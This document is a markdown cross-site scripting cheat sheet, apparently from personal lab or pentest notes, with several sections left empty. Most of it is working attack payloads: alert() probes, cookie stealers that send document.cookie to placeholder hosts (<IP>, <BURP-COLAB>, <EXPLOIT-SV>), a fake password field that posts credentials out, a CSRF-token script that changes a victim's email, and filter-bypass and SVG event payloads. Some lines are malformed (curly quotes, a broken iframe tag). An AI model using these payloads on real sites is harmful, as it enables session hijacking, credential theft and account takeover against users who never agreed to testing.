# XSS - CHEATSHEET + LABS

## Index
- [Walkthrough - Most Important Labs](#walkthrough---most-important-labs)
- [POC-COOKIE-STEALER](#poc-cookie-stealer)
- [GENERIC & POC PAYLOADS](#generic-payloads-poc)
- [COOKIE-STEALER](#cookie-stealer)
- [DATA-STEALER](#data-stealer)
- [BYPASS-RESTRICTIONS](#bypass-restrictions)
- [BYPASS-CPS](#bypass-cps)
- [SVG-TAGS](#svg-tags)
- [CUSTOM-TAGS](#custom-tags)
- [CANONICAL-TAGS](#canonical-tags)
- [FIND TAGS AND EVENTS ALLOWED](#find-tags-and-events-allowed)
- [ANGULAR JS](#angular-js)


## Walkthrough - Most Important Labs

- [1]()
- [2]()
- [3]()
- [4]()


## CHEATSHEET

#### POC-COOKIE-STEALER

> 🧪 POC of cookie stealer in your browser: 🧪

 In web browser → DevTools → Console add a test cookie

```js
document.cookie = "cookieTest=STEAL-ME-PLS";
```

![Screenshot1](/04-Screenshots/poc1.png)

> Find an XSS vulnerability and inject a cookie-exfiltration payload targeting a controlled collaborator endpoint.

![Screenshot2](/04-Screenshots/poc2.png)

![Screenshot3](/04-Screenshots/poc3.png)

Repeat the same procedure with the target victim


#### GENERIC-PAYLOADS-POC
```js
<script>alert(1)</script>
<img src=0 onerror=alert(0)>
<img src=x onerror="&#x61;lert(1)">
<img src=x onerror="#00000000000058;alert(1)">
' - alert(1) - '
' + alert(1) + '
javascript:alert(0)

```

#### COOKIE-STEALER
```js
<img src=0 onerror="new Image().src='http://<IP>/?cookie='+btoa(document.cookie)">

<img src=0 onerror="fetch('http://<IP>/?cookie='+btoa(document.cookie))">

<iframe src="<IP>/?cookie='+btoa(document.cookie))" onload=<img src=1 onerror=alert(1)> hidden="hidden"</iframe>

<script>fetch(`https://<BURP-COLAB>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>
<script>fetch(`https://<EXPLOIT-SV>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>


```

#### DATA-STEALER
```js
// steal creds + cors bypass 
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://IP>',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
```js
 // steal csrf token + cors bypass
 <script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```


#### BYPASS-RESTRICTIONS
```js
// -> escape ' with \
\'<script>alert(1)</script>
// -> escape \ with other \ and escape ' with \
\\'<script>alert(1)</script>
// -> 
</script><script>alert(1)</script>

```

#### BYPASS-CPS
```js

```


#### SVG-TAGS
```js

<svg><animateTransform onbegin=alert(0)>

<svg><a><animate attributeName= href values=javascript:alert(0) /><text x=30 y=30>Click me!</a>

```


#### CANONICAL-TAGS
```js

```


#### CUSTOM-TAGS
```js

```

#### FIND-TAGS-AND-EVENTS-ALLOWED




#### ANGULAR-JS
```js


```
